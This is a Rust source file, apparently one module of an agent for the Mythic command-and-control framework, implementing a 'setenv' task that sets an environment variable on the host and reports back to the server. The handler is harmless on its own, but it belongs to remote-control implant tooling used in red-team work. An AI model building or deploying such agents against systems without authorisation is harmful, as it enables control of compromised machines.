use crate::agent::AgentTask;
use crate::mythic_success;
use serde::Deserialize;
use std::error::Error;
use std::result::Result;

/// Struct containing parameters for `setenv`
#[derive(Deserialize)]
struct SetEnvArgs {
    /// Name of the environment variable to set
    name: String,

    /// Value to set the environment variable to
    value: String,
}

/// Sets an environment variable to a specified value
/// * `task` - Task information
pub fn set_env(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    // Parse the task arguments
    let args: SetEnvArgs = serde_json::from_str(&task.parameters)?;

    // Set the env var
    std::env::set_var(&args.name, &args.value);

    // Send the output to Mythic
    Ok(mythic_success!(task.id, "Set environment"))
}
